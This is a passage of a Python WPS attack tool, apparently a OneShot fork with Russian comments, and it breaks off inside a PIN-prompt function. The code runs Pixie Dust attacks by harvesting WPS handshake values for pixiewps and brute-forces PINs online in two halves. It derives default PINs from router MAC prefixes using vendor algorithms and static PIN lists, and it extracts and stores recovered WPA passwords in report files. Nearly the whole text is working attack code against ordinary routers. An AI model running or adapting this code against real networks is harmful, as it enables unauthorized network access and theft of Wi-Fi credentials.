#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OneShotPin-fork (c) original rofl0r, mod drygdryg, enhanced kimocoder, fork internetkafe
Объединяет простоту и продвинутые возможности:
- Pixie Dust атака
- Онлайн-брутфорс с умным делением PIN на две половины
- Генератор WPS PIN для многих вендоров
- Красивая таблица сканирования с fallback, если не установлен wcwidth
- Режим WPS Push Button
- Сохранение сессий и экспорт учётных данных
- Пакетный режим: атака нескольких целей из файла (--bssid-list)
"""

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any

# ─── Заглушка для wcwidth (zero external dependencies) ───
try:
    import wcwidth
    _HAS_WCWIDTH = True
except ImportError:
    _HAS_WCWIDTH = False

def _wcswidth(text: str) -> int:
    """Возвращает отображаемую ширину строки (колонки терминала).
    Если wcwidth отсутствует — просто количество символов."""
    if _HAS_WCWIDTH:
        return wcwidth.wcswidth(text)
    return len(text)

def truncate_str(s: str, length: int, postfix: str = "…") -> str:
    """
    Обрезает строку до заданной отображаемой ширины.
    Без wcwidth — обрезает по количеству символов.
    """
    if _HAS_WCWIDTH:
        orig_width = wcwidth.wcswidth(s)
        if orig_width <= length:
            return s + ' ' * (length - orig_width)
        postfix_width = wcwidth.wcswidth(postfix)
        max_allowed = length - postfix_width
        current_width = 0
        truncated = []
        for c in s:
            char_width = wcwidth.wcswidth(c)
            if current_width + char_width > max_allowed:
                break
            truncated.append(c)
            current_width += char_width
        result = "".join(truncated)
        if len(truncated) < len(s):
            result += postfix
        result_width = wcwidth.wcswidth(result)
        if result_width > length:
            result = result[:length]
        return result + ' ' * (length - result_width)
    else:
        # Простой fallback: учитываем только число символов
        if len(s) <= length:
            return s + ' ' * (length - len(s))
        if len(postfix) >= length:
            return postfix[:length]
        return s[:length - len(postfix)] + postfix

# ─── Вспомогательные классы (оригинал drygdryg с переводом комментариев) ───

class NetworkAddress:
    """Работа с MAC-адресом: строка ↔ целое число."""
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC адрес должен быть строкой или целым числом')

    @property
    def string(self) -> str:
        return self._str_repr

    @string.setter
    def string(self, value: str) -> None:
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self) -> int:
        return self._int_repr

    @integer.setter
    def integer(self, value: int) -> None:
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self) -> int:
        return self.integer

    def __str__(self) -> str:
        return self.string

    def __iadd__(self, other: int):
        self.integer += other
        return self

    def __isub__(self, other: int):
        self.integer -= other
        return self

    def __eq__(self, other):
        if isinstance(other, NetworkAddress):
            return self.integer == other.integer
        return False

    def __ne__(self, other):
        return not self.__eq__(other)

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac: str) -> int:
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac: int) -> str:
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self) -> str:
        return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'


class WPSpin:
    """Генератор WPS PIN по MAC-адресу (алгоритмы drygdryg)."""
    def __init__(self):
        self.ALGO_MAC = 0      # PIN вычисляется из MAC
        self.ALGO_EMPTY = 1    # пустой PIN (WPS без PIN)
        self.ALGO_STATIC = 2   # фиксированный PIN для вендора

        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            # Статические PIN
            'pinEmpty': {'name': 'Пустой PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}
        }

    @staticmethod
    def checksum(pin: int) -> int:
        """Стандартная контрольная сумма WPS PIN."""
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin //= 10
            accum += (pin % 10)
            pin //= 10
        return (10 - accum % 10) % 10

    def generate(self, algo: str, mac: str) -> str:
        """Сгенерировать PIN по алгоритму и MAC-адресу."""
        mac_obj = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError(f'Неизвестный алгоритм PIN: {algo}')
        pin_func = self.algos[algo]['gen']
        pin = pin_func(mac_obj)
        if algo == 'pinEmpty':
            return ''      # пустой PIN
        pin = pin % 10000000
        return str(pin).zfill(7) + str(self.checksum(pin))

    def getSuggestedList(self, mac: str) -> List[str]:
        """Список наиболее вероятных PIN для данного MAC (по базе OUI)."""
        mac_clean = mac.replace(':', '').upper()
        # Полный словарь соответствия OUI -> алгоритм (сокращён для наглядности)
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC',
                      '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E',
                      'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6',
                      'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1',
                      'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685',
                      'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE',
                      '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3',
                      '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275',
                      '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B',
                      '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D',
                      '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF',
                      '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE',
                      '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C',
                      '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714',
                      '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4',
                      '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4',
                      '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B',
                      '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D',
                      'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1',
                      '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689',
                      '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D',
                      '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB',
                         'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401',
                          '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386',
                          'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B',
                        '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A',
                        '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B',
                        '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF',
                        'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4',
                        '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38',
                        '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419',
                        '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD',
                        '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954',
                        '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423',
                        '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2',
                        'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400',
                        'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6',
                        'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97',
                        '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280',
                        'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF',
                           '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7',
                           '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689',
                         'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215',
                         'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3',
                         'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22',
                         '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F',
                         '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E',
                         '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19',
                         'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8',
                         'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19',
                         'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8',
                         'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19',
                         'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8',
                         'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5',
                          '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223',
                          'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E',
                         'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac_clean.startswith(masks):
                res.append(algo_id)
        return res

    def getSuggestedPins(self, mac: str) -> List[Dict[str, str]]:
        """Возвращает список словарей {id, name, pin} для вероятных алгоритмов."""
        res = []
        for algo_id in self.getSuggestedList(mac):
            algo = self.algos[algo_id]
            res.append({
                'id': algo_id,
                'name': algo['name'],
                'pin': self.generate(algo_id, mac)
            })
        return res

    # Методы генерации PIN под конкретные алгоритмы

    def pin24(self, mac: NetworkAddress) -> int:
        return mac.integer & 0xFFFFFF

    def pin28(self, mac: NetworkAddress) -> int:
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac: NetworkAddress) -> int:
        return mac.integer % 0x100000000

    def pinDLink(self, mac: NetworkAddress) -> int:
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac: NetworkAddress) -> int:
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac: NetworkAddress) -> int:
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac: NetworkAddress) -> int:
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10) \
              + (((b[5] + b[0]) % 10) * 10) \
              + (((b[4] + b[5]) % 10) * 100) \
              + (((b[3] + b[4]) % 10) * 1000) \
              + (((b[2] + b[3]) % 10) * 10000) \
              + (((b[1] + b[2]) % 10) * 100000) \
              + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what: str) -> str:
    """Читает stdout пайпа до тех пор, пока не встретит 'what'."""
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line: str) -> str:
    """Извлекает hex-строку из строки wpa_supplicant вида '... - hexdump(len=...): XX YY ZZ ...'."""
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    """Хранит данные, необходимые для Pixie Dust атаки."""
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self) -> None:
        self.__init__()

    def got_all(self) -> bool:
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range: bool = False) -> str:
        cmd = (f"pixiewps --pke {self.pke} --pkr {self.pkr} --e-hash1 {self.e_hash1} "
               f"--e-hash2 {self.e_hash2} --authkey {self.authkey} --e-nonce {self.e_nonce}")
        if full_range:
            cmd += ' --force'
        return cmd


class ConnectionStatus:
    """Состояние текущей WPS транзакции."""
    def __init__(self):
        self.status = ''            # WSC_NACK, WPS_FAIL, GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self) -> bool:
        return self.last_m_message > 5

    def clear(self) -> None:
        self.__init__()


class BruteforceStatus:
    """Управление прогрессом брутфорса и сохранением сессий."""
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''                       # текущая маска (4 или 7 символов)
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self) -> None:
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print(f'[*] {percentage:.2f}% завершено @ {self.start_time} ({average_pin_time:.2f} секунд/PIN)')

    def registerAttempt(self, mask: str) -> None:
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self) -> None:
        self.__init__()


class Companion:
    """Основной класс: управление wpa_supplicant, атакой, сканированием."""
    def __init__(self, interface: str, save_result: bool = False,
                 print_debug: bool = False, bssid: str = ''):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.tempdir}\nctrl_interface_group=root\nupdate_config=1\n')
            self.tempconf = temp.name
        self.wpas_ctrl_path = f'{self.tempdir}/{interface}'
        self.__init_wpa_supplicant()

        self.res_socket_file = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        for d in (self.sessions_dir, self.pixiewps_dir, self.reports_dir):
            os.makedirs(d, exist_ok=True)

        self.generator = WPSpin()
        self.bssid = bssid
        self.lastPwr = 0

    def __init_wpa_supplicant(self) -> None:
        """Запускает wpa_supplicant и ждёт готовности управляющего сокета."""
        print('[*] Запуск wpa_supplicant…')
        cmd = f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{self.interface} -c{self.tempconf}'
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise RuntimeError('wpa_supplicant завершился с ошибкой: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(0.1)

    def sendOnly(self, command: str) -> None:
        """Отправляет команду wpa_supplicant без получения ответа."""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command: str) -> str:
        """Отправляет команду и возвращает ответ."""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str) -> str:
        """Возвращает человеческое объяснение ошибки wpa_supplicant."""
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] Похоже, wpa_supplicant собран без поддержки WPS. '
                        'Пересоберите с CONFIG_WPS=y')
        return '[!] Что-то пошло не так — смотрите отладочный вывод'

    def __handle_wpas(self, pixiemode: bool = False, pbc_mode: bool = False,
                      verbose: bool = None, bssid: str = "") -> bool:
        """Разбирает строки вывода wpa_supplicant, заполняет данные Pixie Dust и статус."""
        if verbose is None:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', f'Отправка WPS Message M{n}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', f'Принят WPS Message M{n}')
                if n == 5:
                    print('[+] Первая половина PIN верна')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.__print_with_indicators('*', 'Получен WSC NACK')
                print('[-] Ошибка: неверный PIN-код')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert len(self.pixie_creds.e_nonce) == 32
                if pixiemode:
                    print(f'[P] E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert len(self.pixie_creds.pkr) == 384
                if pixiemode:
                    print(f'[P] PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert len(self.pixie_creds.pke) == 384
                if pixiemode:
                    print(f'[P] PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert len(self.pixie_creds.authkey) == 64
                if pixiemode:
                    print(f'[P] AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert len(self.pixie_creds.e_hash1) == 64
                if pixiemode:
                    print(f'[P] E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert len(self.pixie_creds.e_hash2) == 64
                if pixiemode:
                    print(f'[P] E-Hash2: {self.pixie_creds.e_hash2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.__print_with_indicators('*', 'Сканирование…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant вернул WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode(
                    "'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Аутентификация…')
        elif 'Authentication response' in line:
            self.__print_with_indicators('*', 'Аутентифицирован')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode(
                    "'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Ассоциация с точкой доступа…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self.__print_with_indicators('+', f'Ассоциирован с {bssid} (ESSID: {self.connection_status.essid})')
            else:
                self.__print_with_indicators('+', f'Ассоциирован с {bssid}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.__print_with_indicators('*', 'Отправка EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            self.__print_with_indicators('*', 'Получен Identity Request')
        elif 'using real identity' in line:
            self.__print_with_indicators('*', 'Отправка Identity Response…')
        elif self.bssid in line and 'level=' in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print(f'[*] Выбрана точка доступа: {bssid}')
        elif bssid in line and 'level=' in line:
            signal = line.split("level=")[1].split(" ")[0]
            if 'noise=' in line:
                noise = line.split("noise=")[1].split(" ")[0]
                print(f'[i] Текущий сигнал: {signal}, шум: {noise}')
            else:
                print(f'[i] Текущий сигнал: {signal}')

        return True

    def __runPixiewps(self, showcmd: bool = False, full_range: bool = False) -> Optional[str]:
        """Запускает pixiewps и возвращает PIN, если найден."""
        self.__print_with_indicators('*', 'Запуск Pixiewps…')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if '[+]' in line and 'WPS pin' in line:
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = ''
                    return pin
        return None

    def __credentialPrint(self, wps_pin: str = None, wpa_psk: str = None, essid: str = None) -> None:
        """Выводит найденные учётные данные."""
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")

    def __saveResult(self, bssid: str, essid: str, wps_pin: str, wpa_psk: str) -> None:
        """Сохраняет результат в .txt и .csv в папке reports."""
        os.makedirs(self.reports_dir, exist_ok=True)
        filename = os.path.join(self.reports_dir, 'stored')
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as f:
            f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\nWPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')
        writeHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            csvWriter = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Учётные данные сохранены в {filename}.txt, {filename}.csv')

    def __savePin(self, bssid: str, pin: str) -> None:
        """Сохраняет PIN в файл .run для возможного повторного использования."""
        filename = os.path.join(self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
        with open(filename, 'w') as f:
            f.write(pin)
        print(f'[i] PIN сохранён в {filename}')

    def __prompt_wpspin(self, bssid: str) -> Optional[str]:
        """Предлагает пользователю выбрать PIN из сгенерированного списка."""
        pins = self.generator.getSuggestedPins(bssid)
        if not pins:
            return None
        if len(pins) == 1:
            print(f'[i] Выбран единственный вероятный PIN: {pins[0]["name"]}')
            return pins[0]['pin']
        print(f'Сгенерированные PIN для {bssid}:')
        print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Название'))
        for i, pin in enumerate(pins):
            print(f'{i+1}) {pin["pin"]:<10} {pin["name"]}')
        while True:
            try:
                choice = int(input('Выберите PIN: '))
                if 1 <= choice <= len(pins):
                    return pins[choice-1]['pin']
